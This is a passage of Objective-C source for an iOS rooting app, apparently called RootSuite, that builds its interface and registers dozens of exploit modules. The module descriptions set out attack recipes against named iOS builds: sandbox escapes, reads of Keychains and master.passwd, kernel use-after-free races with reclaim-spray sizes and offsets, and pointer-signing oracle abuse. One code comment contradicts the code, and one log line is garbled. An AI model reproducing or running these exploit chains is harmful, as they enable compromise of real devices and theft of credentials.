    [self.runButton setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    self.runButton.layer.cornerRadius = 26; self.runButton.clipsToBounds = NO;
    CAGradientLayer *runGrad = [CAGradientLayer layer];
    runGrad.colors = @[(id)ACCENT().CGColor, (id)ACCENT2().CGColor];
    runGrad.startPoint = CGPointMake(0, 0.5); runGrad.endPoint = CGPointMake(1, 0.5);
    runGrad.cornerRadius = 26;
    [self.runButton.layer insertSublayer:runGrad atIndex:0];
    self.runButton.layer.shadowColor = ACCENT().CGColor;
    self.runButton.layer.shadowRadius = 16; self.runButton.layer.shadowOpacity = 0.45;
    self.runButton.layer.shadowOffset = CGSizeZero;
    [self.runButton addTarget:self action:@selector(run) forControlEvents:UIControlEventTouchUpInside];

    UIButton *sileo = [UIButton buttonWithType:UIButtonTypeSystem];
    sileo.translatesAutoresizingMaskIntoConstraints = NO;
    sileo.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [sileo setTitle:@"Sileo" forState:UIControlStateNormal];
    [sileo setTitleColor:INFO() forState:UIControlStateNormal];
    sileo.backgroundColor = CARD(); sileo.layer.cornerRadius = 10;
    sileo.layer.borderColor = HAIR().CGColor; sileo.layer.borderWidth = 0.5;
    sileo.tag = 1001;
    [sileo addTarget:self action:@selector(installer:) forControlEvents:UIControlEventTouchUpInside];

    UIButton *term = [UIButton buttonWithType:UIButtonTypeSystem];
    term.translatesAutoresizingMaskIntoConstraints = NO;
    term.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [term setTitle:@"Terminal" forState:UIControlStateNormal];
    [term setTitleColor:TEXT() forState:UIControlStateNormal];
    term.backgroundColor = CARD(); term.layer.cornerRadius = 10;
    term.layer.borderColor = HAIR().CGColor; term.layer.borderWidth = 0.5;
    term.tag = 1002;
    [term addTarget:self action:@selector(installer:) forControlEvents:UIControlEventTouchUpInside];

    g_status = [UILabel new]; g_status.translatesAutoresizingMaskIntoConstraints = NO;
    g_status.font = [UIFont systemFontOfSize:10]; g_status.textColor = SUB();
    g_status.textAlignment = NSTextAlignmentCenter;
    g_status.text = @"checking root...";

    // the log lives in its own tab (RSTextVC as a tab root); the main screen
    // keeps only the status line, so no TextKit work happens per log line

    UILabel *credit = [UILabel new]; credit.translatesAutoresizingMaskIntoConstraints = NO;
    credit.text = @"Sideloadly signed - team 5G33ZSZ4G5 - every module offline-measured";
    credit.font = [UIFont systemFontOfSize:9]; credit.textColor = SUB();
    credit.textAlignment = NSTextAlignmentCenter;

    [vc.view addSubview:logo]; [vc.view addSubview:self.titleLabel]; [vc.view addSubview:self.subtitleLabel];
    [vc.view addSubview:g_rootPill]; [vc.view addSubview:self.runButton];
    [vc.view addSubview:logBtn];
    [vc.view addSubview:self.table]; [vc.view addSubview:self.allButton];
    [vc.view addSubview:sileo]; [vc.view addSubview:term];
    [vc.view addSubview:g_status]; [vc.view addSubview:credit];
    g_mainVC = vc;

    [NSLayoutConstraint activateConstraints:@[
        [logBtn.topAnchor constraintEqualToAnchor:g.topAnchor constant:10],
        [logBtn.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [logBtn.widthAnchor constraintEqualToConstant:52], [logBtn.heightAnchor constraintEqualToConstant:26],
        [logo.topAnchor constraintEqualToAnchor:g.topAnchor constant:4],
        [logo.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor],
        [logo.widthAnchor constraintEqualToConstant:76], [logo.heightAnchor constraintEqualToConstant:76],
        [self.titleLabel.topAnchor constraintEqualToAnchor:logo.bottomAnchor constant:2],
        [self.titleLabel.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor],
        [self.subtitleLabel.topAnchor constraintEqualToAnchor:self.titleLabel.bottomAnchor constant:2],
        [self.subtitleLabel.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor],
        [g_rootPill.topAnchor constraintEqualToAnchor:self.subtitleLabel.bottomAnchor constant:10],
        [g_rootPill.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor],
        [g_rootPill.widthAnchor constraintEqualToConstant:188], [g_rootPill.heightAnchor constraintEqualToConstant:26],
        [self.runButton.topAnchor constraintEqualToAnchor:g_rootPill.bottomAnchor constant:10],
        [self.runButton.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [self.runButton.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [self.runButton.heightAnchor constraintEqualToConstant:52],
        [self.table.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:10],
        [self.table.leadingAnchor constraintEqualToAnchor:g.leadingAnchor],
        [self.table.trailingAnchor constraintEqualToAnchor:g.trailingAnchor],
        [self.table.heightAnchor constraintEqualToConstant:238],
        [self.allButton.topAnchor constraintEqualToAnchor:self.table.bottomAnchor constant:8],
        [self.allButton.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [self.allButton.heightAnchor constraintEqualToConstant:34], [self.allButton.widthAnchor constraintEqualToConstant:52],
        [sileo.topAnchor constraintEqualToAnchor:self.table.bottomAnchor constant:8],
        [sileo.leadingAnchor constraintEqualToAnchor:self.allButton.trailingAnchor constant:6],
        [sileo.trailingAnchor constraintEqualToAnchor:vc.view.centerXAnchor constant:-3],
        [sileo.heightAnchor constraintEqualToConstant:34],
        [term.topAnchor constraintEqualToAnchor:self.table.bottomAnchor constant:8],
        [term.leadingAnchor constraintEqualToAnchor:vc.view.centerXAnchor constant:3],
        [term.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [term.heightAnchor constraintEqualToConstant:34],
        [g_status.topAnchor constraintEqualToAnchor:sileo.bottomAnchor constant:6],
        [g_status.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [g_status.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [credit.topAnchor constraintEqualToAnchor:g_status.bottomAnchor constant:5],
        [credit.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [credit.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [credit.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-4],
    ]];

    // the gradient layer has no frame until after the first layout pass
    dispatch_async(dispatch_get_main_queue(), ^{
        for (CALayer *l in self.runButton.layer.sublayers)
            if ([l isKindOfClass:[CAGradientLayer class]]) l.frame = self.runButton.bounds;
    });

    // ---- the stage-1 tab shell: stock UIKit, four destinations -------------
    UITabBarController *tabs = [UITabBarController new];
    tabs.overrideUserInterfaceStyle = UIUserInterfaceStyleDark;
    vc.title = @"Modules";
    vc.tabBarItem = [[UITabBarItem alloc] initWithTitle:@"Modules"
                                                image:[UIImage systemImageNamed:@"list.bullet"] tag:0];
    RSTextVC *logTab = [RSTextVC new];
    logTab.tabMode = YES;                     // no Close button as a tab
    logTab.title = @"Log";
    logTab.tabBarItem = [[UITabBarItem alloc] initWithTitle:@"Log"
                                                     image:[UIImage systemImageNamed:@"text.alignleft"] tag:1];
    RSDiagVC *diag = [RSDiagVC new];
    diag.title = @"Diagnostics";
    diag.tabBarItem = [[UITabBarItem alloc] initWithTitle:@"Diagnostics"
                                                   image:[UIImage systemImageNamed:@"stethoscope"] tag:2];
    RSAboutVC *about = [RSAboutVC new];
    about.title = @"About";
    about.tabBarItem = [[UITabBarItem alloc] initWithTitle:@"About"
                                                    image:[UIImage systemImageNamed:@"info.circle"] tag:3];
    tabs.viewControllers = @[vc, logTab, diag, about];
    self.window.rootViewController = tabs;
    [self.window makeKeyAndVisible];

    self.modules = [NSMutableArray array];

    [self.modules addObject:@{@"name":@"worse_query container escape", @"desc":@"PUBLIC, unpatched on 26.0-26.7.2: read/write every app container", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"worse_query container escape") ?: RunModule(@"worse_query container escape"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"bl_sbx: itunesstored", @"desc":@"PUBLIC: arbitrary write as uid 501, MobileGestalt cache", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"bl_sbx: itunesstored") ?: RunModule(@"bl_sbx: itunesstored"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"Sandbox: bad_query escape", @"desc":@"PROVEN: READ grants on /System and /usr/lib", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Sandbox: bad_query escape") ?: RunModule(@"Sandbox: bad_query escape"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"Root-owned file read", @"desc":@"PROVEN: SystemVersion, Keychains, master.passwd", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Root-owned file read") ?: RunModule(@"Root-owned file read"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"task_for_pid root sweep", @"desc":@"task port of a root pid -> its memory, its code, its identity", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"task_for_pid root sweep") ?: RunModule(@"task_for_pid root sweep"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"mach_vm R/W primitives", @"desc":@"the read/write step a task port unlocks", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"mach_vm R/W primitives") ?: RunModule(@"mach_vm R/W primitives"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"setuid-root binary scan", @"desc":@"setuid helpers reachable through the escape", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"setuid-root binary scan") ?: RunModule(@"setuid-root binary scan"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOKit reachable classes", @"desc":@"user clients an app can open = kernel attack surface", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOKit reachable classes") ?: RunModule(@"IOKit reachable classes"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"daemon surface: Mach services", @"desc":@"privileged daemons answering from the container", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon surface: Mach services") ?: RunModule(@"daemon surface: Mach services"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"daemon pivot: writable paths", @"desc":@"paths a root daemon reads that we can write", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon pivot: writable paths") ?: RunModule(@"daemon pivot: writable paths"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"daemon pivot: container write", @"desc":@"our writes landing in other containers", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon pivot: container write") ?: RunModule(@"daemon pivot: container write"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"JSC scribble R/W", @"desc":@"DarkSword method: addrof/fakeobj -> read64/write64, NO PAC forgery", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC scribble R/W") ?: RunModule(@"JSC scribble R/W"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"WebKit DFG UAF", @"desc":@"PROVEN: addrof + fakeobj (CVE-2025-43529)", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"WebKit DFG UAF") ?: RunModule(@"WebKit DFG UAF"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"JSC structure-ID scan", @"desc":@"the missing piece: in-object R/W without PAC", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC structure-ID scan") ?: RunModule(@"JSC structure-ID scan"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"JSC fake-object R/W", @"desc":@"arbitrary read/write through a real structure ID", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC fake-object R/W") ?: RunModule(@"JSC fake-object R/W"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"dyld PAC oracle", @"desc":@"PROVEN: dyld writes a resolved pointer into our slot", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"dyld PAC oracle") ?: RunModule(@"dyld PAC oracle"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"Kernel posture", @"desc":@"bootargs, AMFI, CSR, tfp0, unrestrictfs", @"status":@"LIVE", @"block":[^{ return RunRootPath(@"Kernel posture") ?: RunModule(@"Kernel posture"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOHID float->int sites", @"desc":@"73 conversion sites - user client gated today", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOHID float->int sites") ?: RunModule(@"IOHID float->int sites"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOSurface format-class", @"desc":@"format consistency, locked=7 / mismatch=0", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOSurface format-class") ?: RunModule(@"IOSurface format-class"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"AVE2 user client", @"desc":@"IOServiceOpen 0xe00002e2 - gated by the sandbox", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"AVE2 user client") ?: RunModule(@"AVE2 user client"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"kernel selector sweep", @"desc":@"selectors on the OPEN JPEG/M2Scaler/KeyStore user clients", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"kernel selector sweep"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"app group diagnostics", @"desc":@"why the group container is nil, and our real pivot base", @"status":@"PIVOT", @"block":[^{ return RunKernelPath(@"app group diagnostics"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOSurfaceRoot selectors", @"desc":@"externalMethod sweep on a reachable root client", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOSurfaceRoot selectors") ?: RunModule(@"IOSurfaceRoot selectors"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"GPU / WebGL", @"desc":@"WebKit WebGL, PBO validation correct (ANGLE absent)", @"status":@"GPU", @"block":[^{ return RunRootPath(@"GPU / WebGL") ?: RunModule(@"GPU / WebGL"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOSkywalk varint (LAN)", @"desc":@"off-by-one in the parser - needs a LAN frame", @"status":@"LAN", @"block":[^{ return RunRootPath(@"IOSkywalk varint (LAN)") ?: RunModule(@"IOSkywalk varint (LAN)"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"XNU ND6 options (LAN)", @"desc":@"4 missing checks - needs a LAN frame", @"status":@"LAN", @"block":[^{ return RunRootPath(@"XNU ND6 options (LAN)") ?: RunModule(@"XNU ND6 options (LAN)"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"CoreServices path handling", @"desc":@"CVE-2026-20615: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices path handling") ?: RunModule(@"CoreServices path handling"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"CoreServices race", @"desc":@"CVE-2026-20617: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices race") ?: RunModule(@"CoreServices race"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"libxpc sandbox break", @"desc":@"CVE-2026-20667: app -> sandbox escape, unpatched on 26.2b1", @"status":@"SBX2K", @"block":[^{ return RunRootPath(@"libxpc sandbox break") ?: RunModule(@"libxpc sandbox break"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"CG Type-5 shading OOB", @"desc":@"CVE-2026-112611: stack OOB write of chosen doubles; gate only landed in 27.2, absent here", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CG Type-5 shading OOB") ?: RunModule(@"CG Type-5 shading OOB"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"43723 mediaremoted root write", @"desc":@"CVE-2026-43723: MediaRemote path traversal -> file write as uid 0 (unpatched on 26.2b1); public dotdot recipe, measured on-device", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"43723 mediaremoted root write") ?: RunModule(@"43723 mediaremoted root write"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112611 force write", @"desc":@"CVE-2026-112611 in-process aimed WRITE (public V545 recipe): Type-5 /C0 overflow -> SIGSEGV handler maps the fault page VM_FLAGS_FIXED -> the store retries into our memory -> scan for our bits", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"112611 force write") ?: RunModule(@"112611 force write"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112477 IOSurfaceRoot UAF", @"desc":@"CVE-2026-112477 (kernel): sel17/18 registry insert/remove race + kalloc.24 groom of fake entries -> stale dup. Port of the public PoC with the out-shape ABI FIXED (the PoC's uint32_t length vs the SDK's size_t made every dup-out fail 0xC2): G hunts the kernel READ, H maps the id qword, K fires the deref canary, KCE dumps the kernelcache header through the proven sandbox escape. AUTO=112477", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAF(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112477 kernel UAF phase2", @"desc":@"The user-client lifetime UAF the device panic PROVED (panic-full-2026-11-20-184853: IOSurface 393.2.9 in the backtrace, far=0x8): race IOServiceClose against in-flight sel17 spam, then reclaim with mach OOL grooms of calibrated size filled with a canary. Crash-resumable on disk; a panic whose far/registers carry the canary = the freed user-client slot is ours = fake user client -> kernel R/W -> ucred patch = uid 0", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAF2(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112477 surface deref control", @"desc":@"panic-full-2026-11-21-092650: the same sel17 fault instruction but far = app-mapping+8 during surface churn - the kernel dereferences a stale pointer into the app's OWN IOSurface memory. Phase 4 keeps those mappings alive, fills every qword with a distinct canary (offset->value map, base addresses logged) and puts the sweep target at +8: a panic whose far names our target = the kernel dereferences memory we control.", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAF3(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112477 V_BIG unit3 direct", @"desc":@"ONE TAP to the panic shape: unit 3 reproduces the panicking configuration exactly (V_BIG - all 8 clients torn down 30us apart under sel17 spam; panic-full-2026-11-20-184853). Skips the state file's 3-unit warmup and the KCE stage (measured dead on 26.2b1); p2Save marks each round before the risky window, so a panic is attributable and the next launch advances past the dead round.", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAFAt(3); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"112477 racer unit6 direct", @"desc":@"The concurrent registry-race oracle in one tap: two threads churn sel17/18 on their own ids while the stale-read oracle measures - the racing context the public PoC's notes say the regression needs and that single-threaded runs cannot see.", @"status":@"ROOT2K", @"block":[^{ return ModIsurfUAFAt(6); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"64788 GPU UAF oracle", @"desc":@"CVE-2026-64788 (public PoC ByteV0rtex, TESTED ON A14): IOGPUDevice::create_resource_iosurface leaves a stale resource entry when a packed 1x65535 overflow takes the error path. Drives the overflow path with IOSurfaces + Metal textures, finds the accelerator user client, sweeps its selectors and logs every code - looking for the PoC oracle 0xe00002be (stale entry processed) vs 0xe00002c2 (not found). No writes, no chain.", @"status":@"ROOT2K", @"block":[^{ return ModIOGPUUAFOracle(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"46285 vm_map wrap", @"desc":@"CVE-2025-46285 (the only root-class CVE; fixed in 26.2): struct vm_map.timestamp is a 32-bit version counter in this build. Measures the increment rate of one map (mmap/munmap churn) and projects the time to 2^32 - the precondition for the version-collision TOCTOU. Resumable across launches.", @"status":@"ROOT2K", @"block":[^{ return ModVmMapWrap(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"AIO teardown race", @"desc":@"Family B reproducer - the MOST FREQUENT kernel bug on this device (48 of 60 panics, pc+0x4cff40): a use-after-free of aio_workq_entry in the AIO/fd teardown (XNU panic 'aio_workq_entry being freed while still enqueued', kern_aio.c). Submits POSIX AIO reads and tears the descriptors down under them (aio_cancel + close) in a loop, so completions and teardown race. A panic = reproduced on demand.", @"status":@"ROOT2K", @"block":[^{ return ModAioRace(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20687 JPEG UAF", @"desc":@"CVE-2026-20687 (public PoC: 0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF, fixed in 26.4 - OUR 26.2b1 IS VULNERABLE): AppleJPEGDriver startDecoder() timeout UAF. 8 threads x 40 x 10 async decodes (selector 1, struct 0x58, asyncToken!=0) then close with requests in flight - the freed JpegRequest (0x440, +0x00 = task_t = PC control) stays in the codec queue. A sync decode afterwards = the deferred panic + UAF read/write. Measures the wired-memory leak.", @"status":@"ROOT2K", @"block":[^{ return ModJpegUAF(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20637 KeyStore UAF", @"desc":@"CVE-2026-20637 (public PoC: zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF, TESTED on iOS 26.1-26.2 = OUR EXACT BUILD, fixed in 26.3): AppleSEPKeyStore IOCommandGate UAF. 8 caller threads hammer IOConnectCallMethod on selectors 0-15 while 4 closer threads race IOServiceClose; the main thread opens 100k connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO delay. The PoC immediately kernel-panics affected devices with '[iokit.IOCommandGate]: element modified after free'.", @"status":@"ROOT2K", @"block":[^{ return ModAksUAF(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20637 reclaim", @"desc":@"The DEVICE-CONFIRMED UAF (25.11 panic: 'IOCommandGate: element modified after free', sz=80) plus a reclaim spray: 80-byte mach messages filled with the 0xC0FFEE5A canary churn kalloc.80 (the freed gate element's zone) while the open/close race runs. A panic showing 0xC0FFEE5A... instead of 0xffffffffffffff00 = the freed element was reclaimed by our data = a CONTROLLED gate element.", @"status":@"ROOT2K", @"block":[^{ return ModAksReclaim(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20687 jpegclose", @"desc":@"CVE-2026-20687 - the hidgate-poc control ladder ported (github.com/hidra0x/hidgate-poc, jpegclose7 + docs/kernel-control.md). Their measured ladder on A12/18.7.2: L2 CONTROLLED 10s free (a sync decode with asyncToken=0 returns kIOReturnTimeout 0xe00002d6 after 10.001s), L3 same-type reclaim (10 async on the same connection right after the timeout), L4 persistent stale node (far=0x308 reproduced WITHOUT Camera by closing the userclient during the sync). This module runs the exact ladder on our A14/26.2b1: prime -> mass spray 8x100x10 -> early reclaim storm (8 conns kept open, codecID t&3) -> victim sync decode + close DURING it -> second reclaim storm -> probe cycles -> free one reclaimer at a time and probe after each. Takes ~4-6 min. Log every kr/dt: kr=0xe00002d6 = controlled free CONFIRMED on our build.", @"status":@"ROOT2K", @"block":[^{ return ModJpegClose(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20687 selectors", @"desc":@"CVE-2026-20687 - AppleJPEGDriverUserClient SELECTOR AUDIT (hidgate-poc jpegmethods2 + docs/applejpeg-methods.md). The decode-UAF reclaim loop is stuck, so their next gate is a DIRECT read/write primitive from another selector: the 0xDA0 and 0x1000 structs are large enough to hold user pointers, async references, notification ports or buffer descriptors. This module probes every selector on our build: sel1 decode sync/async (0x58), sel3 encode (BGRA -> raw), sel6/sel7 async with the 0x58 header at offsets 0/0x10/0x58/0x100 inside the 0xDA0 structs, sel4/sel5 the same inside 0x1000, sel8/sel9 privileged, sel10 out of range - and drains the driver notification port after each call (async completion messages may be the first kernel-side data readable from userland). Diagnostic only. Reachable = kr=0 with a full outSize; 0xe00002c2 bad argument, 0xe00002bc unsupported, 0xe00002c1 not privileged.", @"status":@"ROOT2K", @"block":[^{ return ModJpegMethods(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20687 lastpanic", @"desc":@"Reads back the selector that was being attempted when the device last panicked (Documents/lastsel.txt, written before every sweep call). Makes NO driver calls, so it cannot panic - safe to run right after a reboot. Use it after any AppleJPEGDriver panic to learn the culprit selector: 'last attempted selector before the panic: sel=N shape=M'. shape 0=scalar-only, 1=0x58, 2=0x1000, 3=0xDA0.", @"status":@"ROOT2K", @"block":[^{ return ModJpegLastPanic(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"20687 kalloc440", @"desc":@"CVE-2026-20687 - the reclaim primitive we were MISSING (PoC 0xjohnnydev, uafCharacterize/sprayOOL). The freed object is JpegRequest = 0x440 bytes, so its zone is kalloc(0x440) - not kalloc.80. The reclaim is an OUT-OF-LINE mach message of exactly 0x440 bytes sent to a port we own: the kernel copies our bytes into a kalloc(0x440) allocation and keeps it queued, so the freed JpegRequest slot can be occupied by OUR data. The PoC zeroes +128 (self-ptr) and +784 (flags) so a landed reclaim does not fault, and its ORACLE is: no panic + driver healthy = reclaim succeeded (controlled UAF); panic with FEEDFACE = uncontrolled. Bug mechanism: every async request makes queue_io_gated taggedRetain the userclient; IOServiceClose sets isInactive EARLY; in-flight jobs then hit finish_io_gated which SKIPS taggedRelease = leaked retain + the request freed with its queue node still linked. This module: health oracle (sel2), 100 sequential victim->reclaim cycles, then two 3-thread races with the SAFE spray and with a 0xC0FFEE5A CANARY at every offset except the two UAF-critical ones - a panic on our canary would PROVE the freed slot was ours. REBOOT FIRST if a previous run wedged the driver.", @"status":@"ROOT2K", @"block":[^{ return ModJpegReclaim(); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"CVE-2026-86950 thumbnail", @"desc":@"CoreGraphics heap OOB write via ImageIO PDF thumbnail (Messages path); fixed only in 26.7.1, present here; distance arithmetic verified", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CVE-2026-86950 thumbnail") ?: RunModule(@"CVE-2026-86950 thumbnail"); } copy], @"auto":@(YES)}];
    [self.modules addObject:@{@"name":@"cfprefsd confused deputy", @"desc":@"root daemon reachable from the container (CVE-2019-7286 class)", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"cfprefsd confused deputy") ?: RunModule(@"cfprefsd confused deputy"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"MobileGestalt cache poison", @"desc":@"SystemGroup write -> plist read process-wide", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"MobileGestalt cache poison") ?: RunModule(@"MobileGestalt cache poison"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"writetosymlinked", @"desc":@"PUBLIC: write anywhere under /var/mobile/Containers (fixed 26.2b2)", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"writetosymlinked") ?: RunModule(@"writetosymlinked"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"Unified: JSC R/W + dyld oracle", @"desc":@"both primitives in ONE process (JSContext + dlopen) -> NativeExecutable->m_function", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Unified: JSC R/W + dyld oracle"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"dyld PAC oracle -> signPointer", @"desc":@"CVE-2026-20700: signPointer/context control -> signed gadgets", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"dyld PAC oracle") ?: RunModule(@"dyld PAC oracle"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"AppleJPEGDriver selectors", @"desc":@"CVE-2026-20687: user client OPEN = surface present (no fire)", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"AppleJPEGDriver") ?: RunModule(@"AppleJPEGDriver"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"AppleM2ScalerCSCDriver", @"desc":@"CVE-2026-43655: fixed-offset write +0x1fe4, no fire", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"AppleM2ScalerCSCDriver") ?: RunModule(@"AppleM2ScalerCSCDriver"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"AppleKeyStore close-UAF", @"desc":@"CVE-2026-20637: selector 10 close race, no fire", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"AppleKeyStore") ?: RunModule(@"AppleKeyStore"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"IOTimeSync reachability", @"desc":@"panic weapon only - reported, never fired", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"IOTimeSync") ?: RunModule(@"IOTimeSync"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"HFS flag-nibble", @"desc":@"5/5 on 26.2b1 vs 0/5 on 26.6", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"HFS flag-nibble") ?: RunModule(@"HFS flag-nibble"); } copy], @"auto":@(NO)}];
    [self.modules addObject:@{@"name":@"GPU process carrier", @"desc":@"offscreen GL surface as the GPU-process entry", @"status":@"GPU", @"block":[^{ return RunRootPath(@"GPU process carrier") ?: RunModule(@"GPU process carrier"); } copy], @"auto":@(NO)}];


    // the modules marked @"auto":@(NO) are selected at startup; everything else
    // stays unselected until the user taps it.
    self.selected = [NSMutableIndexSet indexSet];
    for (NSUInteger i = 0; i < self.modules.count; i++) {
        if ([self.modules[i][@"auto"] boolValue]) [self.selected addIndex:i];
    }

    AvePost([NSString stringWithFormat:@"launched modules=%lu", (unsigned long)self.modules.count]);
    AveLog(@"[*] RootSuite ready: tap a module to select it, then Run.");
    AveLog(@"[*] Sileo / Term    root.");
    refreshRootPill();
    [self updateRunTitle];

    // ---- autonomous mode: AUTO=<module name> runs that module at startup -----
    // Lets the host drive the app without touching the phone:
    //   pymobiledevice3 developer dvt launch <bid> --env AUTO=worse_query
    const char *autoEnv = getenv("AUTO");
    if (autoEnv && *autoEnv) {
        NSString *want = [NSString stringWithUTF8String:autoEnv];
        AveLog([NSString stringWithFormat:@"[*] AUTO mode: %@", want]);
        AvePost([NSString stringWithFormat:@"AUTO %@", want]);
        if ([want isEqualToString:@"all"]) {
            if (self.selected.count) {
                [self.table reloadData];
                [self updateRunTitle];
                [self run];
